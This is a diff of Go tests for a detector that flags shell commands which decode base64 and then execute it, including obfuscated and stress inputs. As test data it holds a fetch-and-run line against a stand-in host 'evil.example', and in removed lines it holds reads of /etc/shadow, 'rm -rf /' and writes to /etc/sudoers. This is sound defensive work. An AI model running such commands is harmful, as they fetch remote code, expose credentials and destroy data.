@@ -1,249 +1,166 @@
 package shelldecode
 
 import (
-	"encoding/base64"
+	"strings"
 	"testing"
+	"time"
 
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 )
 
-// pipeDecodeExec 是「把脚本 base64 之后交给 shell 执行」的写法。
-func pipeDecodeExec(script, shell string) string {
-	return "echo '" + base64.StdEncoding.EncodeToString([]byte(script)) + "' | base64 -d | " + shell
-}
-
-func TestDecodeReturnsTheDecodedScript(t *testing.T) {
-	script := "cd /root/docker/vaalhub-web\ndocker compose up -d"
-	got, err := Decode(pipeDecodeExec(script, "bash"))
-	require.NoError(t, err)
-	assert.Equal(t, []string{script}, got)
-}
-
-func TestDecodeRecognisesCommonShellWrappers(t *testing.T) {
-	script := "docker compose up -d"
-	payload := base64.StdEncoding.EncodeToString([]byte(script))
+// 修正轮 4 评审列出的「解码又执行」写法：不论两者怎样连接，都判为既解码又执行。
+// 载荷都是无害的 aWQ=（id）或 ZWNobyBoaQ==（echo hi）。
+func TestDecodeAndExecuteForms(t *testing.T) {
 	cases := []string{
-		pipeDecodeExec(script, "/bin/bash"),
-		"printf '%s' '" + payload + "' | base64 --decode | sh",
-		"echo '" + payload + "' | base64 -d | sudo bash",
-		"echo '" + payload + "' | base64 -d | cat | sh",
-		`bash -c "echo '` + payload + `' | base64 -d | bash"`,
-		"echo '" + payload + "' | base64 -d > /tmp/x.sh && bash /tmp/x.sh",
-		"bash -c \"$(echo '" + payload + "' | base64 -d)\"",
-		"eval \"$(echo '" + payload + "' | base64 -d)\"",
+		"echo aWQ= | base64 -d | sh",
+		"echo aWQ= | base64 --decode | bash",
+		"echo aWQ= | base64 -D | zsh",
+		"(echo aWQ= | base64 -d) | sh",
+		"{ echo aWQ= | base64 -d; } | sh",
+		"echo aWQ= | (base64 -d) | sh",
+		`x=$(echo aWQ= | base64 -d); sh -c "$x"`,
+		`x=$(echo aWQ= | base64 -d); eval "$x"`,
+		`x=$(echo aWQ= | base64 -d); $x`,
+		`env FOO=1 bash -c "$(echo aWQ= | base64 -d)"`,
+		`sudo FOO=1 bash -c "$(echo aWQ= | base64 -d)"`,
+		"timeout 5 sh -c 'echo aWQ= | base64 -d | sh'",
+		"docker exec c sh -c 'echo aWQ= | base64 -d | sh'",
+		"kubectl exec p -- sh -c 'echo aWQ= | base64 -d | sh'",
+		"ssh host 'echo aWQ= | base64 -d | sh'",
+		"su -c 'echo aWQ= | base64 -d | sh'",
+		"if true; then bash -c 'echo aWQ= | base64 -d | sh'; fi",
+		"sh <<'EOF'\necho aWQ= | base64 -d | sh\nEOF",
+		"sh <<EOF\nx=$(echo aWQ= | base64 -d)\n$x\nEOF",
+		"bash -s <<< 'echo aWQ= | base64 -d | sh'",
+		"echo 'echo aWQ= | base64 -d | sh' | sh",
+		"echo aWQ= | base64 -d 2>/dev/null > a.sh; sh a.sh",
+		`echo aWQ= | base64 -d > a.sh; sh "$PWD/a.sh"`,
+		"echo aWQ= | base64 -d > a.sh; cp a.sh b.sh; sh b.sh",
+		`echo aWQ= | base64 -d > a.sh; find . -name a.sh -exec sh {} \;`,
+		"echo aWQ= | base64 -d > a.sh; chmod +x a.sh; PATH=.:$PATH a.sh",
+		"echo aWQ= | base64 -d > a.sh; chmod +x a.sh; ./a.sh",
+		"echo aWQ= | base64 -d > /tmp/a.sh; /tmp/a.sh",
+		"echo aWQ= | openssl base64 -d | sh",
+		"echo aWQ= | openssl enc -d -a | sh",
+		"echo aWQ= | busybox base64 -d | sh",
+		"echo NFSQ==== | base32 -d | sh",
+		"echo dnE= | base64 -d | tr a-z n-za-m > a.sh; sh a.sh",
+		`eval "$(echo YVdRPQ== | base64 -d | base64 -d)"`,
+		"bash <(echo aWQ= | base64 -d)",
+		"source <(echo aWQ= | base64 -d)",
+		". <(echo aWQ= | base64 -d)",
+		`python3 -c "$(echo aWQ= | base64 -d)"`,
+		"echo aWQ= | base64 -d | xargs -I{} sh -c {}",
+		"echo aWQ= | base64 -d | xargs",
+		"echo aWQ= | base64 -d | /bin/sh",
+		"echo aWQ= | ba''se64 -d | s\\h",
+		"ssh h \"bash -c \\\"echo aWQ= | base64 -d | sh\\\"\"",
 	}
 	for _, cmd := range cases {
 		t.Run(cmd, func(t *testing.T) {
-			got, err := Decode(cmd)
+			got, err := DecodesAndRuns(cmd)
 			require.NoError(t, err)
-			assert.Equal(t, []string{script}, got)
+			assert.True(t, got)
 		})
 	}
 }
 
-// 评审复现的写法：原命令里其余的子命令和重定向留在原命令里（调用方原样送审），这里只给出
-// 解码出来会执行的脚本。
-func TestDecodeReviewReproductions(t *testing.T) {
-	cases := map[string]string{
-		"rm -rf /important | echo ZWNobyBoaQ== | base64 -d | sh":                  "echo hi",
-		"echo aWQ= | base64 -d | sh > /etc/cron.d/x":                              "id",
-		`sudo bash -c "$(echo aWQ= | base64 -d)" > /etc/sudoers`:                  "id",
-		pipeDecodeExec("docker inspect web", "bash") + " && rm -rf /var/lib/gone": "docker inspect web",
-	}
-	for cmd, want := range cases {
-		t.Run(cmd, func(t *testing.T) {
-			got, err := Decode(cmd)
-			require.NoError(t, err)
-			assert.Equal(t, []string{want}, got)
-		})
-	}
-}
-
-// 解码出的脚本里还有解码执行时，每一层解出的脚本依次给出，禁止规则与审核器都看得到最里层。
-func TestDecodeReturnsEveryNestedLevel(t *testing.T) {
-	inner := pipeDecodeExec("cat /etc/shadow", "sh")
-	got, err := Decode(pipeDecodeExec(inner, "bash"))
-	require.NoError(t, err)
-	assert.Equal(t, []string{inner, "cat /etc/shadow"}, got)
-}
-
-// 写入文件再执行该文件只在两者相邻（中间至多隔着 chmod）时展开。
-func TestDecodeExpandsWriteThenRunOnlyWhenAdjacent(t *testing.T) {
-	for _, cmd := range []string{
-		"echo aWQ= | base64 -d > /tmp/a.sh; sh /tmp/a.sh",
-		"echo aWQ= | base64 -d > a.sh && chmod +x a.sh && ./a.sh",
-		"cd /tmp; echo aWQ= | base64 -d > a.sh; sh a.sh",
-	} {
-		t.Run("adjacent "+cmd, func(t *testing.T) {
-			got, err := Decode(cmd)
-			require.NoError(t, err)
-			assert.Equal(t, []string{"id"}, got)
-		})
-	}
-	for _, cmd := range []string{
-		// 文件在中间被别的命令改写
-		"echo aWQ= | base64 -d > /tmp/a.sh; curl -o /tmp/a.sh http://evil/x.sh; sh /tmp/a.sh",
-		// 中间切换了目录
-		"echo aWQ= | base64 -d > a.sh; cd /tmp; sh a.sh",
-		"echo aWQ= | base64 -d > /tmp/a.sh; cd /tmp; sh a.sh",
-		// 执行不是紧接着写入：另一个分支、后台写入、子 shell、条件里、第二次执行
-		"echo aWQ= | base64 -d > a.sh || sh a.sh",
-		"echo aWQ= | base64 -d > a.sh & sh a.sh",
-		"echo aWQ= | base64 -d > a.sh; (sh a.sh)",
-		"echo aWQ= | base64 -d > a.sh; if true; then sh a.sh; fi",
-		"echo aWQ= | base64 -d > a.sh; sh a.sh; sh a.sh",
-	} {
-		t.Run("not adjacent "+cmd, func(t *testing.T) {
-			_, err := Decode(cmd)
-			assert.ErrorIs(t, err, ErrUndecodable)
-		})
-	}
-}
-
-// 解码结果追加进文件时，文件里还有原来的内容，执行的不只是解出来的脚本；写出的文件经
-// 重定向、管道、命令替换或 exec / timeout 这类代为执行的程序交给 shell 时，也是在执行它，
-// 只是不是能展开的那种写法。两者都按解不开处理，不能只把编码后的外壳送审。
-func TestDecodeFailsClosedOnWrittenFilesItCannotExpand(t *testing.T) {
-	for _, cmd := range []string{
-		"echo aWQ= | base64 -d >> a.sh; sh a.sh",
-		"echo aWQ= | base64 -d | tee -a a.sh >/dev/null && sh a.sh",
-		"echo aWQ= | base64 -d > /tmp/a.sh; sh < /tmp/a.sh",
-		"echo aWQ= | base64 -d > /tmp/a.sh; cat /tmp/a.sh | sh",
-		"echo aWQ= | base64 -d > a.sh; exec sh a.sh",
-		"echo aWQ= | base64 -d > a.sh && timeout 5 sh a.sh",
-		`echo aWQ= | base64 -d > a.sh; bash -c "$(cat a.sh)"`,
-		"bash -c 'echo aWQ= | base64 -d > /tmp/a.sh'; bash /tmp/a.sh",
-	} {
-		t.Run(cmd, func(t *testing.T) {
-			_, err := Decode(cmd)
-			assert.ErrorIs(t, err, ErrUndecodable)
-		})
-	}
-	// 只是查看写出的文件，没有执行它：没有要追加的脚本。
-	got, err := Decode("echo aWQ= | base64 -d > a.sh; cat a.sh")
-	require.NoError(t, err)
-	assert.Empty(t, got)
-}
-
-func TestDecodeRefusesWhatItCannotRead(t *testing.T) {
-	payload := base64.StdEncoding.EncodeToString([]byte("docker compose up -d"))
-	twice := base64.StdEncoding.EncodeToString([]byte(payload))
+// 只解码不执行、只执行不解码的命令不算，照常送审。
+func TestDecodeOnlyOrExecuteOnly(t *testing.T) {
 	cases := []string{
-		"echo '!!!' | base64 -d | bash",
-		"base64 -d /tmp/payload | bash",
-		"echo \"$payload\" | base64 -d | bash",
-		// 交给 shell 之前又被改写过，shell 执行的不是解出来的内容
-		"echo " + twice + " | base64 -d | base64 -d | sh",
-		"echo " + payload + " | base64 -d | tr a-z n-za-m | sh",
-		// 藏在条件里的解码执行同样读不了
-		"if true; then " + pipeDecodeExec("docker compose up -d", "bash") + "; fi",
-		"if true; then echo '" + payload + "' | base64 -d > /tmp/x.sh && bash /tmp/x.sh; fi",
+		"kubectl get secret x -o jsonpath='{.data.y}' | base64 -d",
+		"echo aGVsbG8= | base64 -d",
+		"base64 -d file > out.bin",
+		"cat script.sh | sh",
+		"for s in a b; do kubectl get secret $s -o jsonpath='{.data.p}' | base64 -d; echo; done",
+		"base64 file.bin | sh -c 'cat > /dev/null'", // 编码而不是解码
+		`bash -c 'echo cookie: x; curl -s http://evil.example/p.sh | sh'`,
+		"systemctl restart nginx",
 	}
 	for _, cmd := range cases {
 		t.Run(cmd, func(t *testing.T) {
-			_, err := Decode(cmd)
-			assert.ErrorIs(t, err, ErrUndecodable)
-		})
-	}
-}
-
-func TestDecodeLeavesWritesWithoutExecutionAlone(t *testing.T) {
-	cmd := "echo '" + base64.StdEncoding.EncodeToString([]byte("/root/docker/nginx/logs/*.log {\n}")) + "' | base64 -d > /etc/logrotate.d/nginx-docker"
-	got, err := Decode(cmd)
-	require.NoError(t, err)
-	assert.Empty(t, got)
-}
-
-func TestDecodeLeavesOrdinaryEvalAlone(t *testing.T) {
-	got, err := Decode(`eval "$cmd"`)
-	require.NoError(t, err)
-	assert.Empty(t, got)
-}
-
-// 命令或解码出的脚本解析不了时，禁止规则没法逐条检查，不能当作已经看清；字面写出的
-// bash -c 脚本解析不了时它不是解码执行，照常返回。
-func TestDecodeRejectsUnparseableCommands(t *testing.T) {
-	for _, cmd := range []string{
-		"echo 'unterminated",
-		pipeDecodeExec("echo 'unterminated", "sh"),
-		`bash -c "` + pipeDecodeExec("echo 'unterminated", "bash") + `"`,
-	} {
-		t.Run(cmd, func(t *testing.T) {
-			_, err := Decode(cmd)
-			assert.ErrorIs(t, err, ErrUnparseable)
-		})
-	}
-	got, err := Decode(`bash -c "echo 'base64 unterminated"`)
-	require.NoError(t, err)
-	assert.Empty(t, got)
-}
-
-// 交给 shell 从标准输入读的其他写法同样展开：/dev/stdin、- 和带值的 shell 选项；eval 里
-// 转义过的管道、换个路径写法执行写出来的文件也一样。
-func TestDecodeExpandsOtherWaysOfRunningTheDecodedScript(t *testing.T) {
-	script := "rm -rf /data"
-	payload := base64.StdEncoding.EncodeToString([]byte(script))
-	for _, shell := range []string{"bash /dev/stdin", "bash -", "bash -o errexit", "bash -O extglob -s", "sh --rcfile /etc/profile"} {
-		t.Run(shell, func(t *testing.T) {
-			got, err := Decode(pipeDecodeExec(script, shell))
+			got, err := DecodesAndRuns(cmd)
 			require.NoError(t, err)
-			assert.Equal(t, []string{script}, got)
-		})
-	}
-	for _, cmd := range []string{
-		`eval echo ` + payload + ` \| base64 -d \| bash`,
-		"echo " + payload + " | base64 -d > x.sh && bash ./x.sh",
-		"echo " + payload + " | base64 -d > /tmp/x.sh && chmod +x /tmp/x.sh && /tmp/x.sh",
-		"echo " + payload + " | base64 -d | sudo tee /tmp/x.sh >/dev/null && bash /tmp/x.sh",
-	} {
-		t.Run(cmd, func(t *testing.T) {
-			got, err := Decode(cmd)
-			require.NoError(t, err)
-			assert.Equal(t, []string{script}, got)
+			assert.False(t, got)
 		})
 	}
 }
 
-// 解码出来的内容去向认不出（交给不认识的程序、经替换或重定向送进 shell、写进文件再被执行
-// 却解不开）时宁可审核失败，不能把只看得到 base64 的命令当成已经看清送审。
-func TestDecodeFailsClosedOnDecodedExecutionItCannotExpand(t *testing.T) {
-	payload := base64.StdEncoding.EncodeToString([]byte("rm -rf /"))
-	decode := "echo " + payload + " | base64 -d"
-	cases := []string{
-		decode + " | source /dev/stdin",
-		decode + " | timeout 60 bash",
-		decode + " | xargs -0 sh -c",
-		decode + " | python3",
-		decode + " | (bash)",
-		decode + " | bash script.sh",
-		"bash < <(" + decode + ")",
-		"source <(" + decode + ")",
-		"$(" + decode + ")",
-		`timeout 9 bash -c "echo $(` + decode + `)"`,
-		"base64 -d -o /tmp/x.sh <<< " + payload + " && bash /tmp/x.sh",
-	}
-	for _, cmd := range cases {
-		t.Run(cmd, func(t *testing.T) {
-			_, err := Decode(cmd)
-			assert.ErrorIs(t, err, ErrUndecodable)
-		})
-	}
+// 判断只看两者是否都出现，不认两者之间的连接：解码进数据文件、再运行无关的解释器，同样不送审。
+// 这是有意的取舍（决定 22），不是误判要修。
+func TestBothPresentWithoutConnectionIsStillRefused(t *testing.T) {
+	got, err := DecodesAndRuns("echo e30= | base64 -d > data.json && python3 app.py data.json")
+	require.NoError(t, err)
+	assert.True(t, got)
 }
 
-// 解码出来只是被查看、比对或写进文件（之后没有执行）的命令没有要追加的脚本。
-func TestDecodeLeavesDecodedDataAlone(t *testing.T) {
-	for _, cmd := range []string{
-		"kubectl get secret db -o jsonpath='{.data.password}' | base64 -d",
-		"kubectl get secret tls -o jsonpath='{.data.tls\\.crt}' | base64 -d | openssl x509 -noout -dates",
-		"echo eyJhIjoxfQ== | base64 -d | jq .",
-		"echo aGVsbG8= | base64 -d | sudo tee /etc/motd >/dev/null",
-		`mysql -p"$(echo cGFzcw== | base64 -d)" -e 'select 1'`,
-	} {
-		t.Run(cmd, func(t *testing.T) {
-			got, err := Decode(cmd)
+func TestUnparseable(t *testing.T) {
+	_, err := DecodesAndRuns("echo 'unterminated | base64 -d | sh")
+	assert.ErrorIs(t, err, ErrUnparseable)
+}
+
+// 超过 16 KiB 的命令不解析，直接报过长。
+func TestTooLongIsNotParsed(t *testing.T) {
+	_, err := DecodesAndRuns("echo " + strings.Repeat("a", MaxCommandBytes))
+	assert.ErrorIs(t, err, ErrTooLong)
+
+	got, err := DecodesAndRuns("echo " + strings.Repeat("a", MaxCommandBytes-len("echo ")))
+	require.NoError(t, err)
+	assert.False(t, got)
+}
+
+// 修正轮 4 评审复现的崩溃与卡死：任何输入都不让进程栈溢出，耗时随长度线性增长。
+func TestStressInputsFinishQuickly(t *testing.T) {
+	pipeline := func(n int, stage string) string {
+		return "if true; then " + strings.TrimSuffix(strings.Repeat(stage+" | ", n), " | ") + "; fi"
+	}
+	largestPipeline := func(stage, tail string) string {
+		n := (MaxCommandBytes - len("if true; then ; fi") - len(tail)) / len(stage+" | ")
+		return pipeline(n, stage) + tail
+	}
+	nested := func(n int, opening, closing string) string {
+		return strings.Repeat(opening, n) + "a" + strings.Repeat(closing, n)
+	}
+	deepest := func(opening, closing string) string {
+		return nested((MaxCommandBytes-1)/len(opening+closing), opening, closing)
+	}
+	cases := map[string]struct {
+		cmd     string
+		wantErr error
+		want    bool
+	}{
+		"200k $( levels":                     {cmd: nested(200000, "$(", ")"), wantErr: ErrTooLong},
+		"200k ( levels":                      {cmd: nested(200000, "(", ")"), wantErr: ErrTooLong},
+		"40k-stage if":                       {cmd: pipeline(40000, "a"), wantErr: ErrTooLong},
+		"5000 $( levels":                     {cmd: nested(5000, "$(", ")")},
+		"deepest $( under the cap":           {cmd: deepest("$(", ")")},
+		"deepest ( under the cap":            {cmd: deepest("(", ")")},
+		"deepest \"$( under the cap":         {cmd: deepest(`"$(`, `)"`)},
+		"deepest bash -c \"$( under the cap": {cmd: deepest(`bash -c "$(`, `)"`)},
+		"largest if pipeline under the cap":  {cmd: largestPipeline("a", "")},
+		"decode near the cap":                {cmd: largestPipeline("base64 -d", "; sh a.sh"), want: true},
+		"nested quoted scripts near the cap": {
+			cmd:  strings.Repeat(`sh -c 'echo aWQ= | base64 -d'; `, MaxCommandBytes/len(`sh -c 'echo aWQ= | base64 -d'; `)),
+			want: true,
+		},
+	}
+	for name, c := range cases {
+		t.Run(name, func(t *testing.T) {
+			if c.wantErr == nil {
+				require.LessOrEqual(t, len(c.cmd), MaxCommandBytes)
+			}
+			start := time.Now()
+			got, err := DecodesAndRuns(c.cmd)
+			elapsed := time.Since(start)
+			t.Logf("%d bytes in %s", len(c.cmd), elapsed)
+			assert.Less(t, elapsed, 2*time.Second)
+			if c.wantErr != nil {
+				assert.ErrorIs(t, err, c.wantErr)
+				return
+			}
 			require.NoError(t, err)
-			assert.Empty(t, got)
+			assert.Equal(t, c.want, got)
 		})
 	}
 }
